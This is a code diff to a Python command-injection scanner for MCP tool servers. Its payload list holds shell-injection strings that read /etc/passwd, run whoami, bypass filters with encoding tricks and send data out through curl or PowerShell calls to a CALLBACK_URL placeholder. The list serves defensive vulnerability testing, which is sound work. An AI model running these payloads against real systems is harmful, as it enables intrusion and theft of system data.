@@ -14,14 +14,14 @@ Tests 150+ payloads across 8 categories:
 
 from __future__ import annotations
 
-import re
-import logging
 import getpass
+import logging
+import re
 import time
 from typing import Any
 
 from mcpsec.client.mcp_client import MCPSecClient
-from mcpsec.models import Finding, Severity, ServerProfile, ToolInfo
+from mcpsec.models import Finding, ServerProfile, Severity
 from mcpsec.scanners.base import BaseScanner
 
 logger = logging.getLogger(__name__)
@@ -29,9 +29,32 @@ logger = logging.getLogger(__name__)
 # ─── Parameter keywords ─────────────────────────────────────────────────────
 
 COMMAND_PARAM_KEYWORDS = [
-    "command", "target", "host", "cmd", "query", "input", "args", "arguments",
-    "script", "exec", "run", "payload", "shell", "program", "bin", "process",
-    "expression", "eval", "code", "statement", "action", "task",
+    "command",
+    "target",
+    "host",
+    "cmd",
+    "query",
+    "input",
+    "args",
+    "arguments",
+    "script",
+    "exec",
+    "run",
+    "payload",
+    "shell",
+    "program",
+    "bin",
+    "process",
+    "expression",
+    "eval",
+    "code",
+    "statement",
+    "action",
+    "task",
+    "address",
+    "ip",
+    "endpoint",
+    "server",
 ]
 
 # ─── Payloads by category ───────────────────────────────────────────────────
@@ -42,6 +65,8 @@ PAYLOADS: dict[str, list[str]] = {
     # Test fundamental command chaining/injection operators
     # ═══════════════════════════════════════════════════════════════
     "basic_unix": [
+        "; echo mcpsec_cmd_success",
+        "| echo mcpsec_cmd_success",
         "; id",
         "| id",
         "|| id",
@@ -62,9 +87,13 @@ PAYLOADS: dict[str, list[str]] = {
         "| cat /etc/passwd",
         "$(cat /etc/passwd)",
     ],
-
     "basic_windows": [
+        "& echo mcpsec_cmd_success",
+        "| echo mcpsec_cmd_success",
         "& whoami",
+        "& dir",
+        "& ipconfig",
+        "& ping -n 1 127.0.0.1",
         "| whoami",
         "|| whoami",
         "&& whoami",
@@ -75,37 +104,33 @@ PAYLOADS: dict[str, list[str]] = {
         "| echo MCPSEC_INJECTED",
         "& type C:\\windows\\win.ini",
     ],
-
     # ═══════════════════════════════════════════════════════════════
     # CATEGORY 2: ENCODING BYPASSES
     # When direct injection is blocked, try encoded variants
     # ═══════════════════════════════════════════════════════════════
     "url_encoding": [
-        "%3B%20id",           # ; id
-        "%7C%20id",           # | id
-        "%26%20id",           # & id
-        "%24%28id%29",        # $(id)
-        "%60id%60",           # `id`
-        "%0Aid",              # \n id
-        "%3B%20whoami",       # ; whoami
-        "%7C%20whoami",       # | whoami
+        "%3B%20id",  # ; id
+        "%7C%20id",  # | id
+        "%26%20id",  # & id
+        "%24%28id%29",  # $(id)
+        "%60id%60",  # `id`
+        "%0Aid",  # \n id
+        "%3B%20whoami",  # ; whoami
+        "%7C%20whoami",  # | whoami
     ],
-
     "double_url_encoding": [
-        "%253B%2520id",       # Double encoded ; id
-        "%257C%2520id",       # Double encoded | id
-        "%2526%2520id",       # Double encoded & id
-        "%250Aid",            # Double encoded \n id
+        "%253B%2520id",  # Double encoded ; id
+        "%257C%2520id",  # Double encoded | id
+        "%2526%2520id",  # Double encoded & id
+        "%250Aid",  # Double encoded \n id
     ],
-
     "unicode_normalization": [
-        "\u037e id",          # Greek question mark (looks like ;)
-        "\uff5c id",          # Fullwidth |
-        "\uff06 id",          # Fullwidth &
-        "\u2024id\u2024",     # One dot leader
-        "\uff1b id",          # Fullwidth ;
+        "\u037e id",  # Greek question mark (looks like ;)
+        "\uff5c id",  # Fullwidth |
+        "\uff06 id",  # Fullwidth &
+        "\u2024id\u2024",  # One dot leader
+        "\uff1b id",  # Fullwidth ;
     ],
-
     "null_byte_injection": [
         "test%00; id",
         "test\x00| id",
@@ -113,7 +138,6 @@ PAYLOADS: dict[str, list[str]] = {
         "test%00; whoami",
         "test\x00&& id",
     ],
-
     # ═══════════════════════════════════════════════════════════════
     # CATEGORY 3: SHELL-SPECIFIC BYPASSES
     # Target specific shell interpreters
@@ -123,16 +147,15 @@ PAYLOADS: dict[str, list[str]] = {
         ";{id,}",
         "$'\\x69\\x64'",
         "${PATH:0:1}bin${PATH:0:1}id",
-        "/???/i?",                     # Glob for /bin/id
+        "/???/i?",  # Glob for /bin/id
         "$(printf '\\x69\\x64')",
-        ";$'\\151\\144'",              # Octal id
+        ";$'\\151\\144'",  # Octal id
         "$(echo${IFS}id)",
         ";$(whoami)",
         "a]||id",
         "${HOME:0:1}etc${HOME:0:1}passwd",
         "$(<${HOME:0:1}etc${HOME:0:1}passwd)",
     ],
-
     "powershell_specific": [
         "| iex(whoami)",
         "| &('who'+'ami')",
@@ -144,7 +167,6 @@ PAYLOADS: dict[str, list[str]] = {
         "| & whoami",
         "; Get-Content C:\\windows\\win.ini",
     ],
-
     "cmd_specific": [
         "| cmd /c whoami",
         "| cmd.exe /c whoami",
@@ -155,7 +177,6 @@ PAYLOADS: dict[str, list[str]] = {
         "& cmd /c echo MCPSEC_INJECTED",
         "| type C:\\windows\\win.ini",
     ],
-
     # ═══════════════════════════════════════════════════════════════
     # CATEGORY 4: ARGUMENT INJECTION
     # When command is fixed but arguments are injectable
@@ -178,7 +199,6 @@ PAYLOADS: dict[str, list[str]] = {
         "--json",
         "--format=json",
     ],
-
     # ═══════════════════════════════════════════════════════════════
     # CATEGORY 5: ENVIRONMENT VARIABLE INJECTION
     # Abuse env vars that affect command execution
@@ -193,7 +213,6 @@ PAYLOADS: dict[str, list[str]] = {
         "PROMPT_COMMAND=id",
         "GLOBIGNORE=*",
     ],
-
     # ═══════════════════════════════════════════════════════════════
     # CATEGORY 6: TIME-BASED BLIND INJECTION
     # When no output is returned, use timing
@@ -210,7 +229,6 @@ PAYLOADS: dict[str, list[str]] = {
         "&& sleep 3",
         "|| sleep 3",
     ],
-
     # ═══════════════════════════════════════════════════════════════
     # CATEGORY 7: OUT-OF-BAND (OOB) DATA EXFILTRATION
     # When no direct output, exfiltrate via DNS/HTTP
@@ -223,7 +241,6 @@ PAYLOADS: dict[str, list[str]] = {
         "$(curl http://CALLBACK_URL/?d=$(cat /etc/passwd|base64))",
         "; powershell -c iwr http://CALLBACK_URL/$(whoami)",
     ],
-
     # ═══════════════════════════════════════════════════════════════
     # CATEGORY 8: FILTER BYPASS TECHNIQUES
     # Common WAF/filter evasion
@@ -235,19 +252,16 @@ PAYLOADS: dict[str, list[str]] = {
         ";id%0a",
         ";id$IFS",
         ";id${IFS}",
-
         # Quote bypass
         ";i'd'",
         ';i"d"',
         ";i\\d",
-
         # Keyword bypass (if 'id' is blocked)
         ";/bin/id",
         ";/usr/bin/id",
         ";/bin/cat /etc/passwd",
         ';"\\bin/id"',
         ";'/bin/id'",
-
         # Concatenation bypass
         ";i''d",
         ';i""d',
@@ -270,7 +284,7 @@ SUCCESS_INDICATORS: dict[str, list[str]] = {
         r"^(root|[a-z_][a-z0-9_-]*)\s*$",
     ],
     "windows_whoami": [
-        r"\\",
+        r"\w+\\[a-zA-Z0-9_-]+",
         r"NT AUTHORITY",
         r"BUILTIN",
     ],
@@ -310,48 +324,45 @@ INJECTION_PAYLOADS = _ALL_PAYLOADS
 def _extract_response(result: Any) -> str:
     """Extract text from an MCP tool call result."""
     text = ""
-    if hasattr(result, 'content'):
+    if hasattr(result, "content"):
         for block in result.content:
-            if hasattr(block, 'text'):
+            if hasattr(block, "text"):
                 text += block.text
     return text
 
 
-def _check_indicators(response_text: str) -> tuple[str, str]:
+def _check_indicators(response_text: str, raw_result: Any = None) -> tuple[str, str]:
     """
     Check response text against success indicators.
-    Returns (evidence, confidence) where confidence is 'CONFIRMED' or 'LIKELY'.
+    Uses the response_classifier for SAFE detection first.
+    Returns (evidence, confidence) where confidence is 'CONFIRMED', 'LIKELY', or ''.
     """
+    from mcpsec.scanners.response_classifier import Verdict, classify_cmd_injection
+
+    verdict, evidence = classify_cmd_injection(response_text, raw_result)
+
+    if verdict == Verdict.SAFE:
+        return "", ""  # Suppressed — security controls blocked the attack
+
+    if verdict == Verdict.CONFIRMED:
+        return evidence, "CONFIRMED"
+
+    if verdict == Verdict.LIKELY:
+        return evidence, "LIKELY"
+
+    # Fall back to legacy canary/user checks for extra coverage
     lower = response_text.lower()
 
-    # Strong evidence: canary strings
     for canary in SUCCESS_INDICATORS["canary"]:
         if canary.lower() in lower:
             return f"Canary '{canary}' found in response", "CONFIRMED"
 
-    # Strong evidence: unix id output
-    for pattern in SUCCESS_INDICATORS["unix_id"]:
-        if re.search(pattern, response_text):
-            return f"Unix id output matched: {pattern}", "CONFIRMED"
-
-    # Strong evidence: file contents
-    for pattern in SUCCESS_INDICATORS["file_read"]:
-        if re.search(pattern, response_text):
-            return f"Sensitive file contents detected: {pattern}", "CONFIRMED"
-
-    # Medium evidence: current user in response
     if _CURRENT_USER and _CURRENT_USER in lower:
         return f"Current username '{_CURRENT_USER}' found in response", "CONFIRMED"
 
-    # Medium evidence: Windows whoami
     for pattern in SUCCESS_INDICATORS["windows_whoami"]:
         if re.search(pattern, response_text):
             return f"Windows identity indicator: {pattern}", "CONFIRMED"
-
-    # Weak evidence: error messages that leak shell behavior
-    for pattern in SUCCESS_INDICATORS["error_leaks"]:
-        if re.search(pattern, response_text, re.IGNORECASE):
-            return f"Shell error message detected: {pattern}", "LIKELY"
 
     return "", ""
 
@@ -365,12 +376,20 @@ class CommandInjectionScanner(BaseScanner):
     name = "command-injection"
     description = "Detect command injection vulnerabilities with 150+ categorized payloads"
 
-    async def scan(self, profile: ServerProfile, client: MCPSecClient | None = None) -> list[Finding]:
+    async def scan(
+        self, profile: ServerProfile, client: MCPSecClient | None = None
+    ) -> list[Finding]:
         findings: list[Finding] = []
         if not client:
             return findings
 
+        from mcpsec.scanners.response_classifier import is_tool_relevant
+
         for tool in profile.tools:
+            # Scanner scoping: skip tools unlikely to shell out
+            if not is_tool_relevant(tool.name, tool.description, "command-injection"):
+                continue
+
             # Test ALL string-type parameters, plus keyword matches
             injectable_params = set()
 
@@ -397,42 +416,47 @@ class CommandInjectionScanner(BaseScanner):
                     try:
                         # Time the request for blind detection
                         start = time.monotonic()
-                        result = await client.call_tool(tool.name, {param_name: payload})
+                        call_args = self._get_dummy_args(tool, param_name, payload)
+                        result = await client.call_tool(tool.name, call_args)
                         elapsed = time.monotonic() - start
 
                         response_text = _extract_response(result)
-                        is_error = getattr(result, 'isError', False)
+                        is_error = getattr(result, "isError", False)
 
-                        # Check indicators
-                        evidence, confidence = _check_indicators(response_text)
+                        # Check indicators (with classifier integration)
+                        evidence, confidence = _check_indicators(response_text, result)
 
-                        # Time-based blind detection (>2.5s for sleep 3 payloads)
-                        if not evidence and "sleep" in payload and elapsed > 2.5:
-                            evidence = f"Time-based detection: {elapsed:.1f}s delay (expected ~3s from sleep payload)"
+                        # Time-based blind detection (>5s for sleep payloads)
+                        if not evidence and "sleep" in payload and elapsed > 5.0:
+                            evidence = f"Time-based detection: {elapsed:.1f}s delay (expected ~5s+ from sleep payload)"
                             confidence = "LIKELY"
 
                         if evidence:
-                            severity = Severity.CRITICAL if confidence == "CONFIRMED" else Severity.HIGH
-                            findings.append(Finding(
-                                severity=severity,
-                                scanner=self.name,
-                                tool_name=tool.name,
-                                parameter=param_name,
-                                title=f"Command Injection in '{param_name}' [{confidence}]",
-                                description=(
-                                    f"Tool '{tool.name}' is vulnerable to command injection "
-                                    f"via the '{param_name}' parameter."
-                                ),
-                                detail=f"Payload: {payload}\nResponse: {response_text[:300]}",
-                                evidence=evidence,
-                                confidence=confidence.lower(),
-                                remediation=(
-                                    "Avoid passing user input to shell commands. "
-                                    "Use subprocess.run(['cmd', 'arg'], shell=False). "
-                                    "Validate input against a strict allowlist."
-                                ),
-                                cwe="CWE-78",
-                            ))
+                            severity = (
+                                Severity.CRITICAL if confidence == "CONFIRMED" else Severity.HIGH
+                            )
+                            findings.append(
+                                Finding(
+                                    severity=severity,
+                                    scanner=self.name,
+                                    tool_name=tool.name,
+                                    parameter=param_name,
+                                    title=f"Command Injection in '{param_name}' [{confidence}]",
+                                    description=(
+                                        f"Tool '{tool.name}' is vulnerable to command injection "
+                                        f"via the '{param_name}' parameter."
+                                    ),
+                                    detail=f"Payload: {payload}\nResponse: {response_text[:300]}",
+                                    evidence=evidence,
+                                    confidence=confidence.lower(),
+                                    remediation=(
+                                        "Avoid passing user input to shell commands. "
+                                        "Use subprocess.run(['cmd', 'arg'], shell=False). "
+                                        "Validate input against a strict allowlist."
+                                    ),
+                                    cwe="CWE-78",
+                                )
+                            )
                             found_vuln = True
 
                     except Exception as e:
